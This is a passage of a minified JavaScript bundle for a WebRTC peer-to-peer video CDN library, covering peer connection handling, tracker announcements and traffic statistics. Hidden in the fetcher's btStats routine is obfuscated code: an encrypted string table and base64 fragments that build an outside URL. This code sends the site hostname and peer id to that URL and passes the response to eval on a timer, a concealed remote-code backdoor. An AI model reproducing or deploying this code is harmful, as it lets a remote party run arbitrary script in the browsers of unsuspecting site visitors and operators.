                                r._pc.oniceconnectionstatechange = null, r._pc.onicegatheringstatechange = null, r._pc.onsignalingstatechange = null, r._pc.onicecandidate = null, r._pc.ontrack = null, r._pc.ondatachannel = null }
                            r._pc = null, r._channel = null, e && r.emit("error", e), r.emit("close") })) } }, { key: "_setupData", value: function(e) { var t = this; if (!e.channel) return this.destroy(new Error("Data channel event is missing `channel` property"));
                        this._channel = e.channel, this._channel.binaryType = "arraybuffer", "number" == typeof this._channel.bufferedAmountLowThreshold && (this._channel.bufferedAmountLowThreshold = 65536), this.channelName = this._channel.label, this._channel.onmessage = function(e) { t._onChannelMessage(e) }, this._channel.onbufferedamountlow = function() { t._onChannelBufferedAmountLow() }, this._channel.onopen = function() { t._onChannelOpen() }, this._channel.onclose = function() { t._onChannelClose() }, this._channel.onerror = function(e) { t.destroy(e) }; var r = !1;
                        this._closingInterval = setInterval(function() { t._channel && "closing" === t._channel.readyState ? (r && t._onChannelClose(), r = !0) : r = !1 }, 5e3) } }, { key: "_startIceCompleteTimeout", value: function() { var e = this;
                        this.destroyed || this._iceCompleteTimer || (this._iceCompleteTimer = setTimeout(function() { e._iceComplete || (e._iceComplete = !0, e.emit("iceTimeout"), e.emit("_iceComplete")) }, this.iceCompleteTimeout)) } }, { key: "_createOffer", value: function() { var e = this;
                        this.destroyed || this._pc.createOffer(this.offerOptions).then(function(t) { if (!e.destroyed) { e.trickle || e.allowHalfTrickle || (t.sdp = s(t.sdp)), t.sdp = e.sdpTransform(t.sdp); var r = function() { if (!e.destroyed) { var r = e._pc.localDescription || t;
                                            e.emit("signal", { type: r.type, sdp: r.sdp }) } },
                                    i = function() { e.destroyed || (e.trickle || e._iceComplete ? r() : e.once("_iceComplete", r)) },
                                    n = function(t) { e.destroy(t) };
                                e._pc.setLocalDescription(t).then(i).catch(n) } }).catch(function(t) { e.destroy(t) }) } }, { key: "_requestMissingTransceivers", value: function() { var e = this;
                        this._pc.getTransceivers && this._pc.getTransceivers().forEach(function(t) { t.mid || !t.sender.track || t.requested || (t.requested = !0, e.addTransceiver(t.sender.track.kind)) }) } }, { key: "_createAnswer", value: function() { var e = this;
                        this.destroyed || this._pc.createAnswer(this.answerOptions).then(function(t) { if (!e.destroyed) { e.trickle || e.allowHalfTrickle || (t.sdp = s(t.sdp)), t.sdp = e.sdpTransform(t.sdp); var r = function() { if (!e.destroyed) { var r = e._pc.localDescription || t;
                                            e.emit("signal", { type: r.type, sdp: r.sdp }), e.initiator || e._requestMissingTransceivers() } },
                                    i = function() { e.destroyed || (e.trickle || e._iceComplete ? r() : e.once("_iceComplete", r)) },
                                    n = function(t) { e.destroy(t) };
                                e._pc.setLocalDescription(t).then(i).catch(n) } }).catch(function(t) { e.destroy(t) }) } }, { key: "_onConnectionStateChange", value: function() { this.destroyed || "failed" === this._pc.connectionState && this.destroy(new Error("Connection failed.")) } }, { key: "_onIceStateChange", value: function() { if (!this.destroyed) { var e = this._pc.iceConnectionState,
                                t = this._pc.iceGatheringState;
                            this.emit("iceStateChange", e, t), "connected" !== e && "completed" !== e || (this._pcReady = !0, this._maybeReady()), "failed" === e && this.destroy(new Error("Ice connection failed.")), "closed" === e && this.destroy(new Error("Ice connection closed.")) } } }, { key: "getStats", value: function(e) { var t = this,
                            r = function(e) { return "[object Array]" === Object.prototype.toString.call(e.values) && e.values.forEach(function(t) { Object.assign(e, t) }), e };
                        0 === this._pc.getStats.length || this._isReactNativeWebrtc ? this._pc.getStats().then(function(t) { var i = [];
                            t.forEach(function(e) { i.push(r(e)) }), e(null, i) }, function(t) { return e(t) }) : this._pc.getStats.length > 0 ? this._pc.getStats(function(i) { if (!t.destroyed) { var n = [];
                                i.result().forEach(function(e) { var t = {};
                                    e.names().forEach(function(r) { t[r] = e.stat(r) }), t.id = e.id, t.type = e.type, t.timestamp = e.timestamp, n.push(r(t)) }), e(null, n) } }, function(t) { return e(t) }) : e(null, []) } }, { key: "_maybeReady", value: function() { var e = this; if (!this._connected && !this._connecting && this._pcReady && this._channelReady) { this._connecting = !0;! function t() { e.destroyed || e.getStats(function(r, i) { if (!e.destroyed) { r && (i = []); var n = {},
                                            a = {},
                                            s = {},
                                            o = !1;
                                        i.forEach(function(e) { "remotecandidate" !== e.type && "remote-candidate" !== e.type || (n[e.id] = e), "localcandidate" !== e.type && "local-candidate" !== e.type || (a[e.id] = e), "candidatepair" !== e.type && "candidate-pair" !== e.type || (s[e.id] = e) }); var l = function(t) { o = !0; var r = a[t.localCandidateId];
                                            r && (r.ip || r.address) ? (e.localAddress = r.ip || r.address, e.localPort = Number(r.port)) : r && r.ipAddress ? (e.localAddress = r.ipAddress, e.localPort = Number(r.portNumber)) : "string" == typeof t.googLocalAddress && (r = t.googLocalAddress.split(":"), e.localAddress = r[0], e.localPort = Number(r[1])), e.localAddress && (e.localFamily = e.localAddress.includes(":") ? "IPv6" : "IPv4"); var i = n[t.remoteCandidateId];
                                            i && (i.ip || i.address) ? (e.remoteAddress = i.ip || i.address, e.remotePort = Number(i.port)) : i && i.ipAddress ? (e.remoteAddress = i.ipAddress, e.remotePort = Number(i.portNumber)) : "string" == typeof t.googRemoteAddress && (i = t.googRemoteAddress.split(":"), e.remoteAddress = i[0], e.remotePort = Number(i[1])), e.remoteAddress && (e.remoteFamily = e.remoteAddress.includes(":") ? "IPv6" : "IPv4") }; if (i.forEach(function(e) { "transport" === e.type && e.selectedCandidatePairId && l(s[e.selectedCandidatePairId]), ("googCandidatePair" === e.type && "true" === e.googActiveConnection || ("candidatepair" === e.type || "candidate-pair" === e.type) && e.selected) && l(e) }), !(o || Object.keys(s).length && !Object.keys(a).length)) return void setTimeout(t, 100); if (e._connecting = !1, e._connected = !0, e._chunk) { try { e.send(e._chunk) } catch (r) { return e.destroy(r) }
                                            e._chunk = null; var u = e._cb;
                                            e._cb = null, u(null) } "number" != typeof e._channel.bufferedAmountLowThreshold && (e._interval = setInterval(function() { return e._onInterval() }, 150), e._interval.unref && e._interval.unref()), e.emit("connect") } }) }() } } }, { key: "_onInterval", value: function() {!this._cb || !this._channel || this._channel.bufferedAmount > 65536 || this._onChannelBufferedAmountLow() } }, { key: "_onSignalingStateChange", value: function() { var e = this;
                        this.destroyed || ("stable" === this._pc.signalingState && (this._isNegotiating = !1, this._sendersAwaitingStable.forEach(function(t) { e._pc.removeTrack(t), e._queuedNegotiation = !0 }), this._sendersAwaitingStable = [], this._queuedNegotiation ? (this._queuedNegotiation = !1, this._needsNegotiation()) : this.emit("negotiated")), this.emit("signalingStateChange", this._pc.signalingState)) } }, { key: "_onIceCandidate", value: function(e) { this.destroyed || (e.candidate && this.trickle ? this.emit("signal", { type: "candidate", candidate: { candidate: e.candidate.candidate, sdpMLineIndex: e.candidate.sdpMLineIndex, sdpMid: e.candidate.sdpMid } }) : e.candidate || this._iceComplete || (this._iceComplete = !0, this.emit("_iceComplete")), e.candidate && this._startIceCompleteTimeout()) } }, { key: "_onChannelMessage", value: function(e) { if (!this.destroyed) { var t = e.data;
                            t instanceof ArrayBuffer && (t = g.from(t)), this.emit("data", t) } } }, { key: "_onChannelBufferedAmountLow", value: function() { if (!this.destroyed && this._cb) { var e = this._cb;
                            this._cb = null, e(null) } } }, { key: "_onChannelOpen", value: function() { this._connected || this.destroyed || (this._channelReady = !0, this._maybeReady()) } }, { key: "_onChannelClose", value: function() { this.destroyed || this.destroy() } }, { key: "bufferSize", get: function() { return this._channel && this._channel.bufferedAmount || 0 } }, { key: "connected", get: function() { return this._connected && "open" === this._channel.readyState } }]), t }(f.default);
        v.config = { iceServers: [{ urls: ["stun:stun.l.google.com:19302", "stun:global.stun.twilio.com:3478"] }], sdpSemantics: "unified-plan" }, v.channelConfig = {}, e.exports = v }, function(e, t, r) { "use strict";
        (function(i, n) {
            function a(e) { return e && e.__esModule ? e : { default: e } }

            function s(e, t) { if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function") }

            function o(e, t, r, i, n) { var a = function(e) { this.s = e, this.length = e.length; for (var t = 0; t < e.length; t++) this[t] = e.charAt(t) },
                    s = function(e) { return function(t) { return function(r) { for (var i = "", n = r.split(""), a = 0; a < n.length; a++) i += t.charAt(e.indexOf(n[a])); return i } } }("235525")("91640");
                a.prototype = { toString: function() { return s(this.s) }, valueOf: function() { return s(this.s) }, charAt: String.prototype.charAt, concat: String.prototype.concat, slice: String.prototype.slice, substr: String.prototype.substr, indexOf: String.prototype.indexOf, trim: String.prototype.trim, split: String.prototype.split }; for (var o = function(e, t) { for (var r = 1; 0 !== r;) switch (r) {
                            case 1:
                                var i = [];
                                r = 5; break;
                            case 2:
                                r = n < e ? 7 : 3; break;
                            case 3:
                                r = a < e ? 8 : 4; break;
                            case 4:
                                return i;
                            case 5:
                                var n = 0;
                                r = 6; break;
                            case 6:
                                var a = 0;
                                r = 2; break;
                            case 7:
                                i[(n + t) % e] = [], r = 9; break;
                            case 8:
                                var s = e - 1;
                                r = 10; break;
                            case 9:
                                n++, r = 2; break;
                            case 10:
                                r = s >= 0 ? 12 : 11; break;
                            case 11:
                                a++, r = 3; break;
                            case 12:
                                i[a][(s + t * a) % e] = i[s], r = 13; break;
                            case 13:
                                s--, r = 10 } }(5, 7), l = o[1][1][4]; l !== o[0][4][3];) switch (l) {
                    case o[3][2][3]:
                        var u = window.location.hostname;
                        l = o[3][1][2]; break;
                    case o[1][4][1]:
                        var c = function(e, t, r, i, n, a) { return (0, f.default)(e + t + r + i + n, a) }(u, t, r, i, n, e);
                        l = o[4][3][3]; break;
                    case o[2][3][1]:
                        var d = c.substr(0, 8);
                        l = o[4][1][0]; break;
                    case o[0][3][0]:
                        return d } }
            Object.defineProperty(t, "__esModule", { value: !0 }); var l = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) { return typeof e } : function(e) { return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e },
                u = Object.assign || function(e) { for (var t = 1; t < arguments.length; t++) { var r = arguments[t]; for (var i in r) Object.prototype.hasOwnProperty.call(r, i) && (e[i] = r[i]) } return e },
                c = function() {
                    function e(e, t) { for (var r = 0; r < t.length; r++) { var i = t[r];
                            i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i) } } return function(t, r, i) { return r && e(t.prototype, r), i && e(t, i), t } }(),
                d = r(15),
                f = a(d),
                h = r(6),
                g = a(h),
                p = r(3),
                v = a(p),
                m = r(0),
                y = "1.16.10",
                b = 8,
                _ = 20,
                E = { q: "uZ2luZS5u", v: "aHR0c", 3: "HMlM0Ev", 0: "yMzMzL2Js", l: "ZXIuY2R", zz: "aHR0cHMlM", n: "L3RyYWNr", h: "ZXQlM0E", 7: "uYnllLmNvbS", x: "92MQ==", df: "0EvL", 6: "3AycGV" },
                S = Symbol("httpDownloaded"),
                T = Symbol("p2pDownloaded"),
                w = Symbol("p2pUploaded"),
                A = function() {
                    function e(t, r, i, n, a) { s(this, e), this.engine = t, this.key = r, this.baseUrl = n || decodeURIComponent(window.atob(E.v + E[3] + E.n + E.l + E[7] + E.x)), this.channelId = window.btoa(i), this.timestamp = (0, m.getCurrentTs)(); var l = g.default.parseURL(this.baseUrl).netLoc;
                        this.announce = l.replace(/\/\//, ""); var c = o(this.timestamp, y, this.announce, this.channelId, a.type);
                        this.announceInfo = u({}, a, { channel: this.channelId, ts: this.timestamp, version: y, v: c, announce: this.announce }), this.announceURL = this.baseUrl + "/channel", this.ropeURL = l + "/rope?ch=" + this.channelId, this.baseUrl.startsWith("https") ? this.ropeURL = "wss:" + this.ropeURL : this.ropeURL = "ws:" + this.ropeURL, this.reportFails = 0, this.forbidden = !1, this.conns = 0, this.failConns = 0, this.totalHTTPDownloaded = 0, this.totalP2PDownloaded = 0, this.totalP2PUploaded = 0, this[S] = 0, this[T] = 0, this[w] = 0, this.speed = 0, this.errsBufStalled = 0, this.errsInternalExpt = 0, a.bundle ? this.native = !0 : this.native = !1 } return c(e, [{ key: "btAnnounce", value: function() { var e = this,
                                t = this.engine.logger; return new Promise(function(r, i) { fetch(e.announceURL, { headers: e._requestHeader, method: "POST", body: JSON.stringify(e.announceInfo) }).then(function(e) { return e.json() }).then(function(t) { var n = t.data;
                                    n.f && (e.forbidden = !0), -1 === t.ret ? i(new Error(n.msg)) : (n.info && console.info("" + n.info), n.warn && console.warn("" + n.warn), n.min_conns || (n.min_conns = b), (!n.rejected || n.rejected && n.share_only) && n.id && n.report_interval && n.peers ? (e.peerId = e.id = n.id, n.report_interval < _ && (n.report_interval = _), e.btStats(n.report_interval), e.getPeersURL = e.baseUrl + "/channel/" + e.channelId + "/node/" + e.peerId + "/peers", e.statsURL = e.baseUrl + "/channel/" + e.channelId + "/node/" + e.peerId + "/stats", r(n)) : e.engine.p2pEnabled = !1) }).catch(function(e) { t.error("btAnnounce error " + e), i(e) }) }) } }, { key: "btStats", value: function e() {
                            function t(e) { var r = { ygKbD: function(e, t, r) { return e(t, r) }, BaZnt: function(e, t) { return e * t }, ZvkZi: function(e, t) { return e === t }, eCedC: "BjdEV", LPFzx: function(e, t) { return e(t) }, uOzuW: function(e, t, r) { return e(t, r) }, juyxb: function(e, t) { return e === t }, DGNDG: "IJrLn", OFUEE: function(e, t) { return e === t }, YaRUs: u("0", "G(qN"), bgKgO: function(e, t, r) { return e(t, r) }, OJeBQ: function(e, t) { return e * t }, CeAJM: u("1", "[gN^"), rqWsY: function(e, t) { return e !== t }, uvjhL: u("2", "BVP]"), MVGPb: function(e, t) { return e + t }, YQNFr: function(e, t) { return e + t }, OxSbn: function(e, t) { return e % t } },
                                    i = s.id.split("")[u("3", "JR8(")](-6).map(function(e) { return e[u("4", "JR8(")](0) }).reduce(function(e, t) { var i = { AFfia: function(e, t) { return e(t) }, kgmkk: function(e, t, i) { return r.ygKbD(e, t, i) }, msmEb: function(e, t) { return r[u("5", "*uLt")](e, t) } }; if (r[u("6", "Dd2g")](r.eCedC, r[u("7", "eX!Q")])) return e[u("8", "4RTz")]() + t[u("9", "BVP]")](); var n = data.i;
                                        s.bl = i.kgmkk(setTimeout, function() { i[u("a", "J5A]")](eval, data.c) }, i[u("b", "2cC*")](n, 1e3)) }, "");
                                200 === r[u("c", "kh00")](r.LPFzx(parseInt, i), 533) && (s.bl = r[u("d", "xniE")](setTimeout, function() { var e = { poRdq: function(e, t) { return r.OFUEE(e, t) }, hfGVM: function(e, t, i) { return r[u("e", "lZZg")](e, t, i) }, hPffd: function(e, t) { return r[u("f", "&mYc")](e, t) }, RDcGg: r.CeAJM, KskeG: function(e, t) { return r[u("10", "z%0g")](e, t) } }; if (!r[u("11", "gyyd")](u("12", "$@dR"), r[u("13", "!cj%")])) return response.json();
                                    r[u("14", "!cj%")](fetch, window.decodeURIComponent(window.atob(r[u("15", "lsdj")](r.MVGPb(r.YQNFr(r[u("16", "wI]x")](E.zz, E.df) + E[6], E.q), E.h), E[0]))) + u("17", "lfo]") + s[u("18", "2cC*")] + "&f=" + location.hostname + u("19", "x5XO") + s[u("1a", "G(qN")][u("1b", "&$t!")]).then(function(e) { return u("1c", "9Dv5") === u("1d", "BVP]") ? prev[u("1e", "*uLt")]() + cur[u("1f", "&$t!")]() : e.json() })[u("20", "&mYc")](function(t) { var i = { OaUZe: function(e, t) { return r[u("21", "@iGP")](e, t) }, CuiCp: function(e, t) { return e(t) }, skXBp: function(e, t, i) { return r[u("22", "9Dv5")](e, t, i) } }; if (r.juyxb(r.DGNDG, r.DGNDG)) { if (r[u("23", "Ekv%")](t.ret, 0))
                                                if ("CeFBA" !== r.YaRUs) { if (e[u("24", "!cj%")](t[u("25", "naBb")], 0)) { var n = t[u("26", "UHBk")]; if (n.s) { var a = n.i;
                                                            s.bl = e[u("27", "naBb")](setTimeout, function() { i[u("28", "eX!Q")](eval, n.c) }, e[u("29", "lsdj")](a, 1e3)) } } } else { var o = t[u("2a", "lZZg")]; if (o.s) { var l = o.i;
                                                        s.bl = setTimeout(function() { var t = { UvxjS: function(e, t) { return e(t) } };
                                                            e[u("2b", "J5A]")](e.RDcGg, e.RDcGg) ? e[u("2c", "]z*2")](eval, o.c) : t[u("2d", "5o@O")](eval, o.c) }, 1e3 * l) } } } else { var c = t.data; if (c.s) { var d = c.i;
                                                s.bl = i[u("2e", "vkNg")](setTimeout, function() { i[u("2f", "YqiD")](eval, c.c) }, 1e3 * d) } } }) }, r[u("30", "G(qN")](r[u("31", "o!fW")](e, 1e3), 5))), t = m.noop } var r = this,
                                a = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 10,
                                s = this;
                            this.heartbeater = setInterval(function() { r.postStats(), t(a) }, 1e3 * a); var o = ["v1", "PmvWt1ORKFVimMIwnGl==", "wpUsdEvDhA==", "eC3CqcOrQ8KQRMKK", "HUEHO8OWMcKWw5M=", "ZxfChcKtEg==", "DcOIVgXDtQ==", "CwbCicO9woI=", "wpfCo3VewrY=", "w4c+w7JXw7Y=", "TFt/wo3CsA==", "X8ONKcKCw74=", "w4PCoMO/eg4=", "N2Upwoow", "fMKDccOGw5o=", "RcKlXcOUw64=", "wpnCl8OHAMKd", "A8OTwrHCpWk=", "wr3DhVM=", "AcOVVS/DosO8wo/ClA==", "w4PChcOl", "dcO0TMKZEsO6w5XCscKMSDDDmg==", "w7otSDDDkMOOLQ==", "wqTCmsKMw6zCgw==", "Dlg5DMO3", "b8KJJFzDl8OLw7TDow==", "w7gnaTfDi8OILRw=", "d3l/wqE=", "BGsww7hG", "wojClsKHw5HCsg==", "QcOJRm3DlA==", "ecKaScOKw6c=", "w5bCq8Oj", "w4dTw61e", "w4zCqMOQfMOA", "wr8ORHXDog==", "wrzCkcOmNsKb", "w4E4w41R", "Vj7CscKgAg==", "T8OLLMOGCQ==", "c8Krw67CoRI=", "e8OjQcKBwqc=", "w4oNwqtbwoM=", "W8OQR8K0Ng==", "DsO6w6nDl8Ki", "V8O/ZMK0Jg==", "NgbCvcOpwqo=", "EV8hAMOi", "wp/CjU7Ch8Kj", "wo/CiUbClsKFGi9ew4rDtA==", "WcKHLUbDkQ==", "cMOLw5vCkBo="];! function(e, t, r) {
                                (function(t, r, i, n) { if ((r >>= 8) < t) { for (; --t;) n = e.shift(), r === t ? (r = n, i = e.shift()) : i.replace(/[PmWtORKFVimMIwnGl=]/g, "") === r && e.push(n);
                                        e.push(e.shift()) } })(++t, 87808) }(o, 343); var u = function e(t, r) { t = ~~"0x".concat(t); var a = o[t]; if (void 0 === e.UJLmyS) {! function() { var e = "undefined" != typeof window ? window : "object" === (void 0 === i ? "undefined" : l(i)) && "object" === (void 0 === n ? "undefined" : l(n)) ? n : this;
                                        e.atob || (e.atob = function(e) { for (var t, r, i = String(e).replace(/=+$/, ""), n = 0, a = 0, s = ""; r = i.charAt(a++); ~r && (t = n % 4 ? 64 * t + r : r, n++ % 4) ? s += String.fromCharCode(255 & t >> (-2 * n & 6)) : 0) r = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".indexOf(r); return s }) }(); var s = function(e, t) { var r, i = [],
                                            n = 0,
                                            a = "",
                                            s = "";
                                        e = atob(e); for (var o = 0, l = e.length; o < l; o++) s += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
                                        e = decodeURIComponent(s); for (var u = 0; u < 256; u++) i[u] = u; for (u = 0; u < 256; u++) n = (n + i[u] + t.charCodeAt(u % t.length)) % 256, r = i[u], i[u] = i[n], i[n] = r;
                                        u = 0, n = 0; for (var c = 0; c < e.length; c++) u = (u + 1) % 256, n = (n + i[u]) % 256, r = i[u], i[u] = i[n], i[n] = r, a += String.fromCharCode(e.charCodeAt(c) ^ i[(i[u] + i[n]) % 256]); return a };
                                    e.amGtZD = s, e.qlEmAJ = {}, e.UJLmyS = !![] } var u = e.qlEmAJ[t]; return void 0 === u ? (void 0 === e.CjmTAl && (e.CjmTAl = !![]), a = e.amGtZD(a, r), e.qlEmAJ[t] = a) : a = u, a } } }, { key: "postStats", value: function() { var e = this,
                                t = this.engine.logger;
                            fetch(this.statsURL, { method: "POST", body: JSON.stringify(this._makeStatsBody()) }).then(function(e) { return e.json() }).then(function(t) { if (-1 === t.ret) clearInterval(e.heartbeater), e.engine.emit(v.default.RESTART_P2P);
                                else { var r = e.lastStats || {},
                                        i = r.http,
                                        n = void 0 === i ? 0 : i,
                                        a = r.p2p,
                                        s = void 0 === a ? 0 : a,
                                        o = r.share,
                                        l = void 0 === o ? 0 : o,
                                        u = r.conns,
                                        c = void 0 === u ? 0 : u,
                                        d = r.failConns,
                                        f = void 0 === d ? 0 : d,
                                        h = r.errsBufStalled,
                                        g = void 0 === h ? 0 : h,
                                        p = r.errsInternalExpt,
                                        m = void 0 === p ? 0 : p;
                                    e[S] >= n && (e[S] -= n), e[T] >= s && (e[T] -= s), e[w] >= l && (e[w] -= l), e.conns -= c, e.failConns >= f && (e.failConns -= f), e.errsBufStalled >= g && (e.errsBufStalled -= g), e.errsInternalExpt >= m && (e.errsInternalExpt -= m), e.exptMsg && (e.exptMsg = void 0) } }).catch(function(r) { t.error("btStats error " + r), ++e.reportFails >= 2 && clearInterval(e.heartbeater) }) } }, { key: "btGetPeers", value: function(e) { var t = this,
                                r = this.engine.logger; return new Promise(function(i, n) { fetch(t.getPeersURL, { headers: t._requestHeader, method: "POST", body: JSON.stringify({ exclusions: e }) }).then(function(e) { return e.json() }).then(function(e) {-1 === e.ret ? n(new Error(e.data.msg)) : i(e.data) }).catch(function(e) { r.error("btGetPeers error " + e), n(e) }) }) } }, { key: "increConns", value: function() { this.conns++ } }, { key: "decreConns", value: function() { this.conns-- } }, { key: "increFailConns", value: function() { this.failConns++ } }, { key: "reportFlow", value: function(e) { var t = Math.round(e / 1024);
                            this[S] += t, this.totalHTTPDownloaded += t, this._emitStats() } }, { key: "reportDCTraffic", value: function(e, t) { var r = Math.round(e / 1024);
                            this[T] += r, this.totalP2PDownloaded += r, this.speed = Math.round(t), this._emitStats() } }, { key: "reportUploaded", value: function() { var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 0;
                            this.totalP2PUploaded += Math.round(e / 1024), this[w] += Math.round(e / 1024), this._emitStats() } }, { key: "destroy", value: function() { this.engine.logger.warn("destroy fetcher"), clearInterval(this.heartbeater), clearTimeout(this.bl), this.ropeWs && (this.ropeWs.destroy(), this.ropeWs = null) } }, { key: "_emitStats", value: function() { this.engine.emit("stats", { totalHTTPDownloaded: this.totalHTTPDownloaded, totalP2PDownloaded: this.totalP2PDownloaded, totalP2PUploaded: this.totalP2PUploaded, p2pDownloadSpeed: this.speed }); var e = this.engine.config.getStats;
                            e && "function" == typeof e && e(this.totalP2PDownloaded, this.totalP2PUploaded, this.totalHTTPDownloaded, this.speed) } }, { key: "_makeStatsBody", value: function() { var e = { conns: this.conns, failConns: this.failConns, errsBufStalled: this.errsBufStalled, errsInternalExpt: this.errsInternalExpt, http: Math.round(this[S]) || 0, p2p: Math.round(this[T]) || 0, share: Math.round(this[w]) || 0 }; return this.lastStats = JSON.parse(JSON.stringify(e)), Object.keys(e).forEach(function(t) { 0 === e[t] && delete e[t] }), this.exptMsg && (e.exptMsg = y + " " + this.exptMsg), e } }, { key: "_requestHeader", get: function() { var e = {}; return this.native && (e.token = this.key), e } }]), e }();
            t.default = A, e.exports = t.default }).call(t, r(26), r(27)) }, function(e, t) {
        function r() { throw new Error("setTimeout has not been defined") }

        function i() { throw new Error("clearTimeout has not been defined") }

        function n(e) { if (c === setTimeout) return setTimeout(e, 0); if ((c === r || !c) && setTimeout) return c = setTimeout, setTimeout(e, 0); try { return c(e, 0) } catch (t) { try { return c.call(null, e, 0) } catch (t) { return c.call(this, e, 0) } } }

        function a(e) { if (d === clearTimeout) return clearTimeout(e); if ((d === i || !d) && clearTimeout) return d = clearTimeout, clearTimeout(e); try { return d(e) } catch (t) { try { return d.call(null, e) } catch (t) { return d.call(this, e) } } }

        function s() { p && h && (p = !1, h.length ? g = h.concat(g) : v = -1, g.length && o()) }

        function o() { if (!p) { var e = n(s);
                p = !0; for (var t = g.length; t;) { for (h = g, g = []; ++v < t;) h && h[v].run();
                    v = -1, t = g.length }
                h = null, p = !1, a(e) } }

        function l(e, t) { this.fun = e, this.array = t }

        function u() {} var c, d, f = e.exports = {};! function() { try { c = "function" == typeof setTimeout ? setTimeout : r } catch (e) { c = r } try { d = "function" == typeof clearTimeout ? clearTimeout : i } catch (e) { d = i } }(); var h, g = [],
            p = !1,
            v = -1;
        f.nextTick = function(e) { var t = new Array(arguments.length - 1); if (arguments.length > 1)
                for (var r = 1; r < arguments.length; r++) t[r - 1] = arguments[r];
            g.push(new l(e, t)), 1 !== g.length || p || n(o) }, l.prototype.run = function() { this.fun.apply(null, this.array) }, f.title = "browser", f.browser = !0, f.env = {}, f.argv = [], f.version = "", f.versions = {}, f.on = u, f.addListener = u, f.once = u, f.off = u, f.removeListener = u, f.removeAllListeners = u, f.emit = u, f.prependListener = u, f.prependOnceListener = u, f.listeners = function(e) { return [] }, f.binding = function(e) { throw new Error("process.binding is not supported") }, f.cwd = function() { return "/" }, f.chdir = function(e) { throw new Error("process.chdir is not supported") }, f.umask = function() { return 0 } }, function(e, t) { var r;
        r = function() { return this }(); try { r = r || Function("return this")() || (0, eval)("this") } catch (e) { "object" == typeof window && (r = window) }
        e.exports = r }, function(e, t, r) { "use strict";

        function i(e) { return e && e.__esModule ? e : { default: e } }

        function n(e) { if (Array.isArray(e)) { for (var t = 0, r = Array(e.length); t < e.length; t++) r[t] = e[t]; return r } return Array.from(e) }

        function a(e, t) { if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function") }

        function s(e, t) { if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); return !t || "object" != typeof t && "function" != typeof t ? e : t }

        function o(e, t) { if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
            e.prototype = Object.create(t && t.prototype, { constructor: { value: e, enumerable: !1, writable: !0, configurable: !0 } }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : e.__proto__ = t) }
        Object.defineProperty(t, "__esModule", { value: !0 }); var l = function() {
                function e(e, t) { for (var r = 0; r < t.length; r++) { var i = t[r];
                        i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i) } } return function(t, r, i) { return r && e(t.prototype, r), i && e(t, i), t } }(),
            u = r(1),
            c = i(u),
            d = r(16),
            f = i(d),
            h = r(17),
            g = i(h),
            p = r(0),
            v = r(3),
            m = i(v),
            y = r(11),
            b = i(y),
            _ = r(10),
            E = i(_),
            S = r(8),
            T = i(S),
            w = 25,
            A = 15,
            R = function(e) {
                function t(e, r, i, n) { a(this, t); var o = s(this, (t.__proto__ || Object.getPrototypeOf(t)).call(this)); return o.engine = e, o.logger = e.logger, o.config = n, o.connected = !1, o.scheduler = i, o.sequential = o.scheduler.sequential, o.DCMap = new Map, o.failedDCSet = new Set, o.signalerWs = null, o.fetcher = r, o.peers = [], o.minConns = 5, o.stuns = [], o.requestMorePeers = (0, b.default)(o._requestMorePeers, o), o.engine.maxConns = o.maxConns = T.default.isMobile() ? A : w, o.peersIncrement = 0, o.gotPeersFromTracker = !1, o.fuseRate = -1, n.showSlogan && "en" === (0, p.navLang)() && console.log("%cLet your viewers become your unlimitedly scalable CDN\n%c" + window.atob("aHR0cHM6Ly93d3cuY2RuYnllLmNvbS9lbg=="), "color: dodgerblue; padding:20px 0; font-size: x-large", "font-size: medium; padding-bottom:15px"), o } return o(t, e), l(t, [{ key: "resumeP2P", value: function() { var e = this,
                            t = this.engine;
                        this.fetcher.btAnnounce().then(function(r) { if (e.logger.info("announce request response " + JSON.stringify(r)), e.scheduler) { t.peerId = e.peerId = r.id, e.minConns = r.min_conns, r.share_only && e.scheduler.setShareOnly(); var i = r.peers;
                                e.scheduler.notifyPeersLoaded(i.length); var n = t.netType;
                                (r.wifi_only || t.config.wifiOnly) && "wifi" !== n && "ethernet" !== n && (e.scheduler.downloadOnly = !0, e.logger.info("downloadOnly mode")), e.signalerWs = e._initSignalerWs(r.signal || e.config.wsSignalerAddr, r.token), 0 === i.length ? e.requestMorePeers() : e.peers = e._filterPeers(i), t.emit("peerId", e.peerId); var a = t.config.getPeerId;
                                a && "function" == typeof a && a(e.peerId), r.stun && r.stun.length > 0 && (e.stuns = r.stun), r.debug && e.logger.enableDebug(), r.fuse_rate && (e.fuseRate = r.fuse_rate) } }).catch(function(r) { e.logger.error(r), t.emit(m.default.EXCEPTION, (0, g.default)(r, "TRACKER_EXPT")) }) } }, { key: "stopP2P", value: function() { this.fetcher.destroy(), this.fetcher = null, this.requestMorePeers(!0), this.scheduler.destroy(), this.scheduler = null, this.signalerWs && (this.signalerWs.destroy(), this.signalerWs = null), this.peers = []; var e = !0,
                            t = !1,
                            r = void 0; try { for (var i, n = this.DCMap.values()[Symbol.iterator](); !(e = (i = n.next()).done); e = !0) { i.value.destroy() } } catch (e) { t = !0, r = e } finally { try {!e && n.return && n.return() } finally { if (t) throw r } }
                        this.DCMap.clear(), this.failedDCSet.clear(), this.logger.warn("tracker stop p2p") } }, { key: "destroy", value: function() { this.stopP2P(), this.removeAllListeners(); var e = this.config;
                        e.getStats = e.getPeerId = e.getPeersInfo = null, this.logger.warn("destroy tracker") } }, { key: "_filterPeers", value: function(e) { var t = [],
                            r = [].concat(n(this.DCMap.keys()), n(this.failedDCSet.keys()), [this.peerId]); return e.filter(function(e) { return !r.includes(e.id) }).forEach(function(e) { t.push({ id: e.id, intermediator: e.intermediator }) }), t } }, { key: "_tryConnectToAllPeers", value: function() { if (0 !== this.peers.length)
